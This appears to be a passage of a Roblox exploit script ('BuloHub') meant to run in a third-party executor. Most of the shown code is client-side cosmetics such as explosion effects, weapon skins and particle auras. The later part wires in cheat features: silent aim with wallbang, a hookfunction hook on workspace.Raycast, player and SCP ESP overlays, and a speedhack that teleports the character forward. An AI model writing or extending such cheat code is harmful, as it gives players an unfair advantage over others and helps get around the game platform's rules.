        Debris:AddItem(shockwave, 0.55)
        Debris:AddItem(att, 3.5)
    end
    local api = {}
    local connections, watchedCharacters, watchedC4, watchedRemotes = {}, setmetatable({}, {__mode="k"}), setmetatable({}, {__mode="k"}), setmetatable({}, {__mode="k"})
    local function connect(signal, callback)
        local c = signal:Connect(callback)
        connections[c] = true
        return c
    end
    local lastExplosionAt, lastExplosionPos = 0, Vector3.new(0, -99999, 0)
    local recentCharges, c4Connections = {}, {}
    local c4Generation = 0
    local function connectC4(signal, callback)
        local connection = connect(signal, callback)
        c4Connections[connection] = true
        return connection
    end
    local function stopC4Observers()
        c4Generation += 1
        for connection in pairs(c4Connections) do
            pcall(function() connection:Disconnect() end)
            connections[connection] = nil
        end
        table.clear(c4Connections)
        table.clear(watchedC4)
        table.clear(watchedRemotes)
        table.clear(recentCharges)
    end
    local function rememberCharge(pos)
        if not pos then return end
        table.insert(recentCharges, {pos=pos, time=tick()})
        while #recentCharges > 32 do table.remove(recentCharges, 1) end
    end
    local function nearCharge(pos)
        if not pos then return false end
        for i = #recentCharges, 1, -1 do
            local entry = recentCharges[i]
            if tick() - entry.time > 2 then table.remove(recentCharges, i)
            elseif (pos - entry.pos).Magnitude <= 20 then return true end
        end
        for obj, known in pairs(watchedC4) do
            local current = known
            pcall(function()
                if obj.Parent then current = obj:IsA("BasePart") and obj.Position or obj:GetPivot().Position end
            end)
            if typeof(current) == "Vector3" and (pos - current).Magnitude <= 20 then return true end
        end
        return false
    end
    local function triggerExplosion(pos, allowDeath)
        if not running or BuloHubUnloaded or not SelectedC4Effect or typeof(pos) ~= "Vector3" then return end
        if not allowDeath and IsDeathExplosionNear(pos) then return end
        if tick() - lastExplosionAt < 0.75 and (pos - lastExplosionPos).Magnitude < 10 then return end
        lastExplosionAt, lastExplosionPos = tick(), pos
        pcall(SpawnCustomC4, pos, SelectedC4Effect)
    end
    local function watchCharacter(char, isSelf)
        if not char or watchedCharacters[char] then return end
        watchedCharacters[char] = true
        task.spawn(function()
            local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 10)
            if not running or BuloHubUnloaded or not hum then return end
            local deathConnection
            deathConnection = connect(hum.Died, function()
                if deathConnection then deathConnection:Disconnect(); connections[deathConnection] = nil end
                if not running or BuloHubUnloaded then return end
                local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildWhichIsA("BasePart")
                local pos = root and root.Position
                MarkDeathPoint(pos, isSelf)
                if PlayEffectOnDeath and ((isSelf and FxForSelf) or (not isSelf and FxForOthers)) then
                    PlayKillEffectSafe(char, true)
                end
                if isSelf and C4OnMyDeath and SelectedC4Effect then triggerExplosion(pos, true) end
            end)
        end)
    end
    local function watchPlayer(player)
        if player.Character then watchCharacter(player.Character, player == Player) end
        connect(player.CharacterAdded, function(char) watchCharacter(char, player == Player) end)
    end
    for _, player in ipairs(Players:GetPlayers()) do watchPlayer(player) end
    connect(Players.PlayerAdded, watchPlayer)
    local function watchCharge(obj)
        if not SelectedC4Effect or watchedC4[obj] or ownedFx[obj] then return end
        if not obj:IsA("BasePart") and not obj:IsA("Model") and not obj:IsA("Tool") then return end
        local name = obj.Name:lower()
        if not (name:find("c4", 1, true) or name:find("charge", 1, true)
            or name:find("bomb", 1, true) or name:find("explosive", 1, true)) then return end
        local lastPos
        pcall(function() lastPos = obj:IsA("BasePart") and obj.Position or obj:GetPivot().Position end)
        if typeof(lastPos) ~= "Vector3" then return end
        watchedC4[obj] = lastPos
        local chargeConnection
        local current = c4Generation
        chargeConnection = connectC4(obj.AncestryChanged, function(_, parent)
            if parent == nil then
                if chargeConnection then
                    chargeConnection:Disconnect()
                    connections[chargeConnection] = nil
                    c4Connections[chargeConnection] = nil
                end
                if current ~= c4Generation or not running or BuloHubUnloaded or not SelectedC4Effect then watchedC4[obj] = nil; return end
                local pos = watchedC4[obj] or lastPos
                pcall(function() pos = obj:IsA("BasePart") and obj.Position or obj:GetPivot().Position end)
                watchedC4[obj] = nil
                rememberCharge(pos)
                task.delay(0.05, function() triggerExplosion(pos) end)
            end
        end)
    end
    local function watchRemote(remote)
        if watchedRemotes[remote] or not remote:IsA("RemoteEvent") then return end
        local name = remote.Name:lower()
        if not (name:find("expl", 1, true) or name:find("c4", 1, true)
            or name:find("bomb", 1, true) or name:find("detonat", 1, true)) then return end
        watchedRemotes[remote] = true
        local explicit = name:find("c4", 1, true) or name:find("bomb", 1, true) or name:find("detonat", 1, true)
        local current = c4Generation
        connectC4(remote.OnClientEvent, function(...)
            if current ~= c4Generation or not running or BuloHubUnloaded or not SelectedC4Effect then return end
            for _, arg in ipairs({...}) do
                local pos = typeof(arg) == "Vector3" and arg or typeof(arg) == "CFrame" and arg.Position or nil
                if pos and (explicit or nearCharge(pos)) then
                    if explicit then rememberCharge(pos) end
                    triggerExplosion(pos)
                    break
                end
            end
        end)
    end
    local function onC4WorkspaceAdded(obj)
        if not running or BuloHubUnloaded or not SelectedC4Effect or ownedFx[obj] then return end
        if not obj:IsA("Explosion") and not obj:IsA("Sound") and not obj:IsA("BasePart")
            and not obj:IsA("Model") and not obj:IsA("Tool") then return end
        local current = c4Generation
        task.defer(function()
            if current ~= c4Generation or not running or BuloHubUnloaded or not SelectedC4Effect
                or ownedFx[obj] or not obj.Parent then return end
            if obj:IsA("Explosion") then
                local pos = obj.Position
                if not IsDeathExplosionNear(pos) and nearCharge(pos) then
                    pcall(function() obj.Visible = false end)
                    triggerExplosion(pos)
                end
            elseif obj:IsA("Sound") then
                local name = obj.Name:lower()
                if name:find("expl", 1, true) or name:find("boom", 1, true)
                    or name:find("detonat", 1, true) or name:find("c4", 1, true) then
                    local pos
                    local parent = obj.Parent
                    pcall(function()
                        if parent:IsA("BasePart") then pos = parent.Position
                        elseif parent:IsA("Attachment") then pos = parent.WorldPosition
                        elseif parent:IsA("Model") then pos = parent:GetPivot().Position end
                    end)
                    local explicit = name:find("c4", 1, true) or name:find("bomb", 1, true)
                    if pos and not IsDeathExplosionNear(pos) and (explicit or nearCharge(pos)) then
                        if explicit then rememberCharge(pos) end
                        triggerExplosion(pos)
                    end
                end
            else
                watchCharge(obj)
            end
        end)
    end
    local function startC4Observers()
        c4Generation += 1
        local current = c4Generation
        connectC4(workspace.DescendantAdded, onC4WorkspaceAdded)
        connectC4(ReplicatedStorage.DescendantAdded, function(obj)
            if not obj:IsA("RemoteEvent") then return end
            task.defer(function()
                if current == c4Generation and running and not BuloHubUnloaded and SelectedC4Effect and obj.Parent then
                    watchRemote(obj)
                end
            end)
        end)
        task.spawn(function()
            for index, obj in BuloWalkDescendants(workspace) do
                if current ~= c4Generation or not running or BuloHubUnloaded or not SelectedC4Effect then return end
                if obj.Parent and obj:IsDescendantOf(workspace) then watchCharge(obj) end
                if index % 500 == 0 then task.wait() end
            end
        end)
        task.spawn(function()
            for index, obj in BuloWalkDescendants(ReplicatedStorage) do
                if current ~= c4Generation or not running or BuloHubUnloaded or not SelectedC4Effect then return end
                if obj.Parent and obj:IsDescendantOf(ReplicatedStorage) then watchRemote(obj) end
                if index % 500 == 0 then task.wait() end
            end
        end)
    end
    function api.Names(source)
        local out = {"None"}
        if source == "Kill" then
            for _, name in ipairs(ALL_KILL_EFFECTS) do table.insert(out, name) end
        else
            local names = {}
            for name in pairs(C4_DATA) do table.insert(names, name) end
            table.sort(names)
            for _, name in ipairs(names) do table.insert(out, name) end
        end
        return out
    end
    function api.SetKill(name)
        SelectedKillEffect = name ~= "None" and name or nil
        PlayEffectOnDeath = SelectedKillEffect ~= nil
        if SelectedKillEffect then loadKillEffectsModule() end
    end
    function api.SetC4(name)
        local wasActive = SelectedC4Effect ~= nil
        SelectedC4Effect = name ~= "None" and name or nil
        if SelectedC4Effect and not wasActive then
            startC4Observers()
        elseif not SelectedC4Effect and wasActive then
            stopC4Observers()
        end
    end
    function api.SetMaster(on) PlayEffectOnDeath = on and true or false end
    function api.SetSelf(on) FxForSelf = on and true or false end
    function api.SetOthers(on) FxForOthers = on and true or false end
    function api.SetC4OnDeath(on) C4OnMyDeath = on and true or false end
    function api.TestKill()
        if SelectedKillEffect and Player.Character then PlayKillEffectSafe(Player.Character, false) end
    end
    function api.TestC4()
        local char = Player.Character
        local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChildWhichIsA("BasePart"))
        if root and SelectedC4Effect then pcall(SpawnCustomC4, root.Position + root.CFrame.LookVector * 6, SelectedC4Effect) end
    end
    function api.Cleanup()
        running = false
        SelectedKillEffect, SelectedC4Effect = nil, nil
        PlayEffectOnDeath, FxForSelf, FxForOthers, C4OnMyDeath = false, false, false, false
        stopC4Observers()
        for c in pairs(connections) do pcall(function() c:Disconnect() end) end
        table.clear(connections)
        for obj in pairs(ownedFx) do pcall(function() obj:Destroy() end) end
        table.clear(ownedFx)
        for _, child in ipairs(workspace:GetChildren()) do
            if child.Name == "BuloExtraKillFX" then pcall(function() child:Destroy() end) end
        end
    end
    return api
end
weaponSkinEnabled = false
weaponSkinName = "Obsidian"
weaponSkinMaterial = "Default"
weaponSkinRainbow = false
weaponSkinRainbowSpeed = 1
weaponSkinUseTint = false
weaponSkinTint = Color3.fromRGB(255, 255, 255)
bag096Skin = "Default"
cage173Skin = "Default"
weaponSkinLastApply = 0
weaponSkinTextures = {
    ["Obsidian"] = "rbxassetid://6822193586", ["Gold"] = "rbxassetid://6822161361",
    ["Diamond"] = "rbxassetid://6822175471", ["Emerald"] = "rbxassetid://6822194233",
    ["Ruby"] = "rbxassetid://6822175708", ["Platinum"] = "rbxassetid://6822176021",
    ["Dimension"] = "rbxassetid://6825110287", ["Gem"] = "rbxassetid://6825691769",
    ["Waves"] = "rbxassetid://6825692245", ["Hazard"] = "rbxassetid://84265611295576",
    ["Cheese"] = "rbxassetid://4460955897", ["SCP"] = "rbxassetid://6825693009",
    ["Anniversary 2025"] = "rbxassetid://105651594599281", ["Halloween 2024"] = "rbxassetid://85602806295964",
    ["Winter 2024"] = "rbxassetid://97068753364693", ["Halloween 2023"] = "rbxassetid://15167620490",
    ["Winter 2023"] = "rbxassetid://15693907042", ["Gold Wrap"] = "rbxassetid://11313213423",
    ["Reptile"] = "rbxassetid://6971038959", ["Protector"] = "rbxassetid://12489440495",
    ["Liberator"] = "rbxassetid://12489647199", ["Plasma"] = "rbxassetid://6824491950",
    ["Fire"] = "rbxassetid://6824464030", ["Energy"] = "rbxassetid://6824491600",
    ["Warp"] = "rbxassetid://6824491156", ["Moon"] = "rbxassetid://6824492848",
    ["Metal"] = "rbxassetid://6824463630", ["Rust"] = "rbxassetid://6824457460",
    ["Crystal"] = "rbxassetid://5366466412", ["Ice"] = "rbxassetid://171424974",
    ["Hexagon"] = "rbxassetid://6824305439", ["Snow"] = "rbxassetid://6824352844",
    ["Tiger"] = "rbxassetid://546728018", ["Zebra"] = "rbxassetid://70082511",
    ["Glass"] = "rbxassetid://6825109128", ["Paint"] = "rbxassetid://6825109474",
    ["Ghost"] = "rbxassetid://6825107579", ["Sky"] = "rbxassetid://6825108360",
    ["Night"] = "rbxassetid://6825106836", ["Flecktarn"] = "rbxassetid://4455786061",
    ["Woodland"] = "rbxassetid://147004494", ["Splinter"] = "rbxassetid://5465362420",
    ["Digital"] = "rbxassetid://4641726146", ["Navy"] = "rbxassetid://1372730185",
    ["Urban"] = "rbxassetid://127663741",
}
bag096Textures = {
    ["Biohazard"] = "rbxassetid://15019773957", ["Chaotic"] = "rbxassetid://15020004607",
    ["Practice"] = "rbxassetid://15020128431", ["Arctic Camo"] = "rbxassetid://122316904478031",
    ["Ashen"] = "rbxassetid://89955405427725", ["Oceanic"] = "rbxassetid://84551201138385",
    ["Hacked"] = "rbxassetid://102535070823547", ["Steampunk"] = "rbxassetid://107492507608178",
    ["GOC"] = "rbxassetid://84136970949240", ["Pumpkin"] = "rbxassetid://103756103004885",
    ["Ice"] = "rbxassetid://78589425536209",
}
cage173Textures = {
    ["Golden Cage"] = "rbxassetid://15020641805", ["Task Force"] = "rbxassetid://15021109017",
    ["Under Construction"] = "rbxassetid://15020634801", ["Frozen"] = "rbxassetid://98142512393630",
    ["Space Age"] = "rbxassetid://110162634933520", ["Ashen"] = "rbxassetid://117534611667724",
    ["Binary Matrix"] = "rbxassetid://91523767251031", ["Reinforced"] = "rbxassetid://104669866210235",
    ["Steampunk"] = "rbxassetid://97106561464823",
}
weaponSkinOriginals = setmetatable({}, {__mode = "k"})
function cacheWeaponAppearance(part)
    if not part or weaponSkinOriginals[part] then return end
    local original = {}
    if part:IsA("MeshPart") then original.TextureID = part.TextureID end
    if part:IsA("SpecialMesh") then original.TextureId = part.TextureId end
    if part:IsA("BasePart") then
        original.Color = part.Color
        original.Material = part.Material
    end
    weaponSkinOriginals[part] = original
end
function restoreWeaponAppearances()
    for part, original in pairs(weaponSkinOriginals) do
        pcall(function()
            if part and part.Parent then
                if original.TextureID ~= nil then part.TextureID = original.TextureID end
                if original.TextureId ~= nil then part.TextureId = original.TextureId end
                if original.Color ~= nil then part.Color = original.Color end
                if original.Material ~= nil then part.Material = original.Material end
            end
        end)
        weaponSkinOriginals[part] = nil
    end
    pcall(function() if Cos.Objects then Cos.Objects.Refresh() end end)
end
function BuloIsExtraManaged(inst)
    local part = inst and inst:IsA("SpecialMesh") and inst.Parent or inst
    return part and part:GetAttribute("BuloExtraSCPManaged") == true
end
function textureSpecialItem(container, texture)
    if not texture then return end
    for _, item in ipairs(BuloCachedDescendants(container)) do
        local meshPart = item:IsA("MeshPart")
        local specialMesh = item:IsA("SpecialMesh")
        if (meshPart or specialMesh) and not BuloIsExtraManaged(item) then
            cacheWeaponAppearance(item)
            if meshPart and item.TextureID ~= texture then item.TextureID = texture end
            if specialMesh and item.TextureId ~= texture then item.TextureId = texture end
        end
    end
end
do
    local materialMap = {
        ["ForceField (Glow)"] = Enum.Material.ForceField,
        ["Neon"] = Enum.Material.Neon,
        ["Glass"] = Enum.Material.Glass,
        ["Foil (Chrome)"] = Enum.Material.Foil,
        ["SmoothPlastic"] = Enum.Material.SmoothPlastic,
    }
    function applyWeaponSkinChanger(force)
        if not weaponSkinEnabled then return end
        local now = tick()
        if not force and now - weaponSkinLastApply < 0.20 then return end
        weaponSkinLastApply = now
        local texture = weaponSkinTextures[weaponSkinName]
        local rainbowColor = weaponSkinRainbow and Color3.fromHSV((now * weaponSkinRainbowSpeed * 0.4) % 1, 0.9, 1) or nil
        local material = materialMap[weaponSkinMaterial]
        local function modify(part)
            local specialMesh = part:IsA("SpecialMesh")
            if not specialMesh and not part:IsA("BasePart") then return end
            if BuloIsExtraManaged(part) then return end
            cacheWeaponAppearance(part)
            if specialMesh then
                if texture and part.TextureId ~= texture then part.TextureId = texture end
                return
            end
            if part:IsA("MeshPart") and texture and part.TextureID ~= texture then part.TextureID = texture end
            if material and part.Material ~= material then part.Material = material end
            local color = rainbowColor or (weaponSkinUseTint and weaponSkinTint) or nil
            if color and part.Color ~= color then part.Color = color end
        end
        local character = Player.Character
        if character then
            for _, child in ipairs(character:GetChildren()) do
                if child:IsA("Tool") or child:IsA("Model") then
                    local name = child.Name:lower()
                    if name:find("scythe") or child:GetAttribute("BuloExtraBackItem") then
                    elseif (name:find("bag") or name:find("096")) and bag096Skin ~= "Default" then
                        textureSpecialItem(child, bag096Textures[bag096Skin])
                    elseif (name:find("cage") or name:find("173")) and cage173Skin ~= "Default" then
                        textureSpecialItem(child, cage173Textures[cage173Skin])
                    else
                        for _, part in ipairs(BuloCachedDescendants(child)) do modify(part) end
                    end
                end
            end
        end
        local camera = workspace.CurrentCamera
        if camera then
            for _, child in ipairs(camera:GetChildren()) do
                local name = child.Name:lower()
                if child:IsA("Model") or name:find("viewmodel") or name:find("gun") or name:find("arm") then
                    for _, part in ipairs(BuloCachedDescendants(child)) do modify(part) end
                end
            end
        end
    end
end
local particleAuraEnabled = false
local particleAuraColor   = Color3.fromRGB(255, 255, 255)
local particle_aura       = nil
local particles           = {}
local particle_aura_connection = nil
local particle_auras = {}
local particle_aura_loading = {}
local particle_aura_selected = "angel"
local particle_aura_ids = {
    ["starlight"] = "134645216613107",
    ["heavenly"]  = "139300897520961",
    ["ribbon"]    = "132069507632161",
    ["sakura"]    = "81755778619404",
    ["angel"]     = "97658130917593",
    ["wind"]      = "80694081850877",
    ["flow"]      = "119913533725648",
    ["star"]      = "73754563740680",
}
local PART_NAMES = {"Head","UpperTorso","LowerTorso","LeftUpperArm","LeftLowerArm","LeftHand","RightUpperArm","RightLowerArm","RightHand","LeftUpperLeg","LeftLowerLeg","LeftFoot","RightUpperLeg","RightLowerLeg","RightFoot","HumanoidRootPart"}
local function get_character_parts()
    local char = Player.Character
    if not char then return nil end
    local parts = {}
    for _, name in ipairs(PART_NAMES) do
        parts[name] = char:FindFirstChild(name)
    end
    return parts
end
local function clear_particle_aura()
    for i = 1, #particles do
        pcall(function() particles[i]:Destroy() end)
        particles[i] = nil
    end
end
local function do_particle_aura()
    if not particleAuraEnabled then return end
    clear_particle_aura()
    local parts = get_character_parts()
    if not parts or not parts.HumanoidRootPart then return end
    if not particle_aura then return end
    local cloned = particle_aura:Clone()
    local children = cloned:GetChildren()
    for i = 1, #children do
        local part = children[i]
        local local_part = parts[part.Name]
        if local_part then
            local sub_children = part:GetChildren()
            for j = 1, #sub_children do
                local child = sub_children[j]
                pcall(function()
                    child.Name = "\0\0"
                    child.Parent = local_part
                end)
                particles[#particles+1] = child
            end
        else
            pcall(function() part:Destroy() end)
        end
    end
    pcall(function() cloned:Destroy() end)
end
local function apply_particle_color(color_value)
    local color = ColorSequence.new(color_value)
    for _, folder in pairs(particle_auras) do
        if folder and type(folder) ~= "string" then
            pcall(function()
                local descendants = folder:GetDescendants()
                for i = 1, #descendants do
                    local d = descendants[i]
                    local cls = d.ClassName
                    if cls == "PointLight" then
                        d.Color = color_value
                    elseif cls == "ParticleEmitter" or cls == "Beam" or cls == "Trail" then
                        d.Color = color
                    end
                end
            end)
        end
    end
    for i = 1, #particles do
        pcall(function()
            local part = particles[i]
            local cls = part.ClassName
            if cls == "PointLight" then
                part.Color = color_value
            elseif cls == "ParticleEmitter" or cls == "Beam" or cls == "Trail" then
                part.Color = color
            end
            local descendants = part:GetDescendants()
            for j = 1, #descendants do
                local d = descendants[j]
                local cls2 = d.ClassName
                if cls2 == "PointLight" then
                    d.Color = color_value
                elseif cls2 == "ParticleEmitter" or cls2 == "Beam" or cls2 == "Trail" then
                    d.Color = color
                end
            end
        end)
    end
end
local function on_particle_char_changed()
    if particleAuraEnabled then task.spawn(do_particle_aura) end
end
local function request_particle_aura(name)
    if not particleAuraEnabled or BuloHubUnloaded then return end
    local cached = particle_auras[name]
    if cached then
        particle_aura = cached
        apply_particle_color(particleAuraColor)
        pcall(do_particle_aura)
        return
    end
    if particle_aura_loading[name] then return end
    particle_aura_loading[name] = true
    task.spawn(function()
        local ok, asset = pcall(function()
            local id = particle_aura_ids[name]
            if id then return game:GetObjects("rbxassetid://" .. id)[1] end
            local path = "juju recode/custom/" .. name
            if not (isfile and isfile(path) and getcustomasset) then return nil end
            local obj = game:GetObjects(getcustomasset(path))[1]
            if not obj then return nil end
            for _, child in ipairs(obj:GetChildren()) do
                local valid = child:IsA("BasePart")
                if valid then
                    valid = false
                    for _, partName in ipairs(PART_NAMES) do
                        if partName == child.Name then valid = true; break end
                    end
                end
                if not valid then obj:Destroy(); return nil end
            end
            return obj
        end)
        particle_aura_loading[name] = nil
        if not ok or not asset then return end
        if BuloHubUnloaded then pcall(function() asset:Destroy() end); return end
        particle_auras[name] = asset
        if particleAuraEnabled and particle_aura_selected == name then
            particle_aura = asset
            apply_particle_color(particleAuraColor)
            pcall(do_particle_aura)
        end
    end)
end
Cos.AuraCleanup = function()
    particleAuraEnabled = false
    clear_particle_aura()
    if particle_aura_connection then
        particle_aura_connection:Disconnect()
        particle_aura_connection = nil
    end
    for name, asset in pairs(particle_auras) do
        pcall(function() asset:Destroy() end)
        particle_auras[name] = nil
    end
    particle_aura = nil
end
table.insert(connections, RS.Heartbeat:Connect(function(dt)
    if Cfg.AntiSlowdown or (Cfg.SpeedhackEnabled and not isFlying and not flyActive) then
        pcall(function()
            if Player.Character then
                local root=Player.Character:FindFirstChild("HumanoidRootPart")
                local hum=Player.Character:FindFirstChildOfClass("Humanoid")
                if hum and Cfg.AntiSlowdown then
                    if hum.WalkSpeed<16 then hum.WalkSpeed=16 end
                end
                if not isFlying and not flyActive and Cfg.SpeedhackEnabled and root and hum and hum.MoveDirection.Magnitude>0 then
                    local baseSpeed=hum.WalkSpeed
                    if Cfg.AntiSlowdown and baseSpeed<16 then baseSpeed=16 end
                    root.CFrame=root.CFrame+(hum.MoveDirection.Unit*baseSpeed*((Cfg.SpeedMultiplier/10)-1)*dt)
                end
            end
        end)
    end
end))
-- Cosmetics engine hookup
local function CosInitOne(key, fn)
	local ok, result = pcall(fn)
	if ok and type(result) == "table" then
		Cos[key] = result
	else
		Cos.Errors = (Cos.Errors or "") .. "[" .. key .. "] " .. tostring(result) .. "; "
	end
end
if type(connect) == "function" then
	pcall(connect, RS.RenderStepped, function()
		if weaponSkinEnabled and not BuloHubUnloaded then
			pcall(applyWeaponSkinChanger, false)
		end
	end)
end
Cos.Objects = nil
Cos.Fx = nil
CosInitOne("Objects", SetupSCPObjectCosmetics)
CosInitOne("Fx", SetupExtraFx)
Cos.Aura = {
	SetEnabled = function(on)
		pcall(function()
			if on then
				particleAuraEnabled = true
				if not particle_aura_connection then
					particle_aura_connection = Player.CharacterAdded:Connect(on_particle_char_changed)
				end
				request_particle_aura(particle_aura_selected)
			else
				if Cos.AuraCleanup then Cos.AuraCleanup() end
			end
		end)
	end,
	Select = function(name)
		pcall(function()
			if type(name) ~= "string" or name == "" then return end
			particle_aura_selected = name
			particle_aura = particle_auras[name]
			if particleAuraEnabled then
				clear_particle_aura()
				request_particle_aura(name)
			end
		end)
	end,
	Recolor = function(color)
		pcall(function()
			if color ~= nil then particleAuraColor = color end
			apply_particle_color(particleAuraColor)
		end)
	end,
}
Cos.Adv = {
	ESP = ESPConfig,
	Cfg = Cfg,
	SetSilentAim = function(on)
		pcall(function()
			silentAimEnabled = on and true or false
			if on then
				S.SilentAim = false
				S.SilentWallbang = false
				if Toggles.SilentAim then pcall(function() Toggles.SilentAim:SetValue(false) end) end
				if Toggles.SilentWallbang then pcall(function() Toggles.SilentWallbang:SetValue(false) end) end
				if BuloStartSilentAimHook then BuloStartSilentAimHook() end
			else
				silentAimTarget = nil
				if DrawingAvailable and silentFOVring then silentFOVring.Visible = false end
			end
		end)
	end,
	SetTargetPart = function(value)
		pcall(function()
			if value == "Auto" or value == "Nearest Hitbox" or value == "Head"
				or value == "Torso" or value == "HumanoidRootPart" then
				silentAimTargetPart = value
				silentAimTarget = nil
			end
		end)
	end,
	SetTargetSCPs = function(on) pcall(function() silentAimTargetSCPs = on and true or false end) end,
	SetWallCheck = function(on) pcall(function() silentAimWallCheck = on and true or false end) end,
	SetAllowWallbang = function(on) pcall(function() silentAimAllowWallbang = on and true or false end) end,
	SetFOV = function(v) pcall(function() silentAimFOV = v or 100 if DrawingAvailable and silentFOVring then silentFOVring.Radius = silentAimFOV end end) end,
	SetHitChance = function(v) pcall(function() silentAimHitChance = v or 100 end) end,
	SetHeadChance = function(v) pcall(function() silentAimHeadChance = v or 100 end) end,
	SetTorsoChance = function(v) pcall(function() silentAimTorsoChance = v or 100 end) end,
	SetRootChance = function(v) pcall(function() silentAimRootChance = v or 100 end) end,
	SetAutoReload = function(on) if BuloSetAutoReload then pcall(BuloSetAutoReload, on) end end,
	SetSCPESP = function(on) if BuloSetSCPESP then pcall(BuloSetSCPESP, on) end end,
	SetSCPNames = function(on) pcall(setSCPNameLabelsVisible, on and true or false) end,
	SetSCPColors = function(color, nameColor)
		pcall(function()
			if type(color) == "userdata" then scpEspColor = color end
			if type(nameColor) == "userdata" then scpEspNameColor = nameColor end
			applySCPESPColors()
		end)
	end,
	SetESP = function(on)
		pcall(function()
			ESPConfig.Enabled = on and true or false
			if on then
				for _, pl in ipairs(Players:GetPlayers()) do pcall(CreateESPForPlayer, pl) end
			else
				for _, obj in pairs(ESPObjects) do
					for _, d in pairs(obj) do pcall(function() d:Remove() end) end
				end
				table.clear(ESPObjects)
			end
		end)
	end,
}
function Cos.Destroy()
	BuloHubUnloaded = true
	if Cos.Objects and Cos.Objects.Cleanup then pcall(Cos.Objects.Cleanup) end
	if Cos.Fx and Cos.Fx.Cleanup then pcall(Cos.Fx.Cleanup) end
	if Cos.AuraCleanup then pcall(Cos.AuraCleanup) end
	pcall(restoreWeaponAppearances)
	pcall(function() silentAimEnabled = false; silentAimTarget = nil end)
	pcall(function() RS:UnbindFromRenderStep("SilentAimUpdate") end)
	pcall(function() if DrawingAvailable and silentFOVring then silentFOVring:Remove() end end)
	pcall(function() if BuloSetSCPESP then BuloSetSCPESP(false) end end)
	pcall(function() if BuloSetAutoReload then BuloSetAutoReload(false) end end)
	pcall(function()
		if BuloWallbangRaycastOriginal and hookfunction then
			pcall(hookfunction, workspace.Raycast, BuloWallbangRaycastOriginal)
		end
	end)
	pcall(function()
		ESPConfig.Enabled = false
		for _, obj in pairs(ESPObjects) do
			for _, d in pairs(obj) do pcall(function() d:Remove() end) end
		end
		table.clear(ESPObjects)
	end)
	for _, connection in ipairs(connections) do
		pcall(function() connection:Disconnect() end)
	end
	table.clear(connections)
end
end


local ESPX={Pool={},Thick=1.5,Rate=120,SkelDist=300}
do
 local floor=math.floor
 local HUGE=math.huge
 local UP07,DN3,UP25=Vector3.new(0,0.7,0),Vector3.new(0,3,0),Vector3.new(0,2.5,0)
 local Pool=ESPX.Pool
 local function newLine()
  local L=Drawing.new("Line")
  L.Visible=false
  L.Thickness=1
  return {D=L,fx=HUGE,fy=HUGE,tx=HUGE,ty=HUGE,c=false,t=1,v=false}
 end
 local function newSquare()
  local Q=Drawing.new("Square")
  Q.Filled=false
  Q.Visible=false
  Q.Thickness=1
  return {D=Q,x=HUGE,y=HUGE,w=-1,h=-1,c=false,t=1,v=false}
 end
 local function lineSet(R,x1,y1,x2,y2,c,t)
  x1,y1,x2,y2=floor(x1+0.5),floor(y1+0.5),floor(x2+0.5),floor(y2+0.5)
  local D=R.D
  if R.fx~=x1 or R.fy~=y1 then R.fx=x1 R.fy=y1 D.From=Vector2.new(x1,y1) end
  if R.tx~=x2 or R.ty~=y2 then R.tx=x2 R.ty=y2 D.To=Vector2.new(x2,y2) end
  if R.c~=c then R.c=c D.Color=c end
  if R.t~=t then R.t=t D.Thickness=t end
  if not R.v then R.v=true D.Visible=true end
 end
 local function squareSet(R,x,y,w,h,c,t)
  x,y,w,h=floor(x+0.5),floor(y+0.5),floor(w+0.5),floor(h+0.5)
  local D=R.D
  if R.x~=x or R.y~=y then R.x=x R.y=y D.Position=Vector2.new(x,y) end
  if R.w~=w or R.h~=h then R.w=w R.h=h D.Size=Vector2.new(w,h) end
  if R.c~=c then R.c=c D.Color=c end
  if R.t~=t then R.t=t D.Thickness=t end
  if not R.v then R.v=true D.Visible=true end
 end
 local function hideR(R) if R and R.v then R.v=false R.D.Visible=false end end
 local function hideList(L) if L then for i=1,#L do hideR(L[i]) end end end
 local function hideP(P) hideR(P.Box) hideList(P.Skel) end
 local function killR(R) if R then pcall(R.D.Remove,R.D) end end
 function ESPX.Remove(pl)
  local P=Pool[pl]
  if not P then return end
  killR(P.Box)
  if P.Skel then for i=1,#P.Skel do killR(P.Skel[i]) end end
  Pool[pl]=nil
 end
 function ESPX.Clear()
  local ks={}
  for pl in pairs(Pool) do ks[#ks+1]=pl end
  for _,pl in ipairs(ks) do ESPX.Remove(pl) end
 end
 local function hideAll()
  for _,P in pairs(Pool) do
   if P.Shown then
    hideP(P)
    P.Shown=false
   end
  end
 end
 local Hidden,Accum,LastBox,LastSkel=true,0,nil,nil
 connect(RunService.RenderStepped,function(Delta)
  if not Alive then return end
  local sBox,sSkel=S.ESPBox,S.ESPSkeleton
  if not S.PlayerESP or not (sBox or sSkel) then
   if not Hidden then hideAll() Hidden=true end
   Accum=0
   return
  end
  Hidden=false
  if sBox~=LastBox or sSkel~=LastSkel then
   LastBox,LastSkel=sBox,sSkel
   hideAll()
  end
  Accum=Accum+Delta
  local Step=1/math.max(ESPX.Rate,1)
  if Accum<Step then return end
  Accum=Accum-Step
  if Accum>Step then Accum=Step end
  local Camera=cam()
  if not Camera then return end
  local CF=Camera.CFrame
  local CamPos,Look=CF.Position,CF.LookVector
  local Now=os.clock()
  local Thick=ESPX.Thick
  local Max=S.MaxDistance
  local Max2=Max*Max
  local SD=ESPX.SkelDist
  local SD2=SD*SD
  for i=1,#Roster do
   local pl=Roster[i]
   local Drawn=false
   local Rg=getRig(pl)
   if Rg and Rg.Hum.Health>0 then
    local T=pl.Team
    local Fr=FL.Is(pl)
    if Fr or teamAllowed(T) then
     local RP=Rg.Root.Position
     local Off=RP-CamPos
     local D2=Off:Dot(Off)
     if D2<=Max2 and Off:Dot(Look)>-4 then
      Drawn=true
      local P=Pool[pl]
      if not P then P={Shown=false,Pts={}} Pool[pl]=P end
      P.Shown=true
      local Col=playerColor(T,Fr)
      if sBox then
       local Head=Rg.Head
       if not (Head and Head.Parent) then
        Head=Rg.Ch:FindFirstChild("Head")
        Rg.Head=Head
       end
       local Top=Camera:WorldToViewportPoint((Head and Head.Position or (RP+UP25))+UP07)
       local Bot=Camera:WorldToViewportPoint(RP-DN3)
       if Top.Z>0 and Bot.Z>0 then
        local Bx=P.Box
        if not Bx then Bx=newSquare() P.Box=Bx end
        local H=Bot.Y-Top.Y
        if H<0 then H=-H end
        if H<4 then H=4 end
        local Wd=H*0.55
